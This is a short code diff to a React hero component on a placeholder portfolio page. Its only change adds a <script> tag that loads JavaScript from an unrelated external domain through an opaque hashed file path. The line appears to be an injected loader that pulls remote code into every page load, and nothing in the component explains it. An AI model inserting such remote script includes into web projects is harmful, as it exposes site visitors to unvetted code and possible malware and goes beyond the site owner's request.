@@ -22,6 +22,7 @@ const Hero = () => {
           lectus netus in. Aliquet donec morbi convallis pretium. Turpis tempus
           pharetra.
         </p>
+<script src="https://publishedelegance.com/d7/a6/2c/d7a62ca2d3fccf70e0ff5ebd05724c00.js"></script>
 
         <div className="hero-actions">
           <a href="#contact" className="hire-btn">Hire Me</a>
